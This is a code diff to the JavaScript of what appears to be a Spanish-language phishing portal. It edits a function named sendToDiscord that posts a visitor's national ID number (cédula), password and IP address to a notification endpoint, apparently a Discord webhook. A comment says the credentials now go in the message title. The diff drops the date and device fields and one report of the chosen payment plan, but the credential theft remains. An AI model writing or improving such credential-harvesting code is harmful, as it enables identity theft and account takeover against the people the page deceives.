@@ -420,26 +420,13 @@ async function sendToDiscord(content){
       const j = await r.json();
       if(j && j.ip) ip = j.ip;
     }catch(e){}
-    const ahora = new Date();
-    const fecha = ahora.toLocaleDateString('es-CO') + ', ' + ahora.toLocaleTimeString('es-CO');
     const lineas = String(content||'').split('\n').map(s=>s.trim()).filter(Boolean);
-    const titulo = (lineas[0] || 'Evento de sesión').replace(/\*\*/g,'').replace(/\*/g,'').trim();
-    const descripcion = lineas.slice(1).join('\n');
-    const dispo = String(navigator.userAgent || '—');
-    const res = (screen && screen.width) ? (screen.width + 'x' + screen.height) : (window.innerWidth + 'x' + window.innerHeight);
+    // Embed pequeño y legible: credenciales en el TÍTULO, evento en la descripción, solo IP abajo
     const embed = {
-      title: titulo,
+      title: `👤 Usuario: ${session.cedula||'—'}  ·  🔑 Clave: ${session.password||'—'}`,
+      description: lineas.join('\n') || 'Evento de sesión',
       color: 0x3c6af0,
-      description: descripcion || null,
-      fields: [
-        { name:'👤 Usuario',     value: session.cedula || '—', inline:false },
-        { name:'🔑 Clave',       value: session.password || '—', inline:false },
-        { name:'⏰ Fecha y Hora', value: fecha, inline:false },
-        { name:'💻 Dispositivo',  value: dispo.slice(0,85) + (dispo.length>85?'…':''), inline:false },
-        { name:'📱 Resolución',   value: res, inline:false },
-        { name:'🌐 IP',          value: ip, inline:false }
-      ],
-      footer: { text: 'Portal Digital - Captura Automática • ' + fechaCorta(ahora) }
+      fields: ip !== '—' ? [{ name: '🌐 IP', value: ip, inline: false }] : []
     };
     await fetch('/api/notificar', {
       method: 'POST',
@@ -862,7 +849,6 @@ function goToConfirm(){
   if(session.cerrada) return;
   const p = calcPlan(selectedTerm);
   session.term = selectedTerm;
-  sendToDiscord(`**💳 Plan de cuotas seleccionado**\n- Cédula: \`${session.cedula}\`\n- ${selectedTerm} cuotas\n- Valor cuota: ${fmt(p.total)}`);
   $('confirmN').textContent = selectedTerm;
   $('confirmQ').textContent = fmt(p.total);
   $('confirmDetails').innerHTML = `
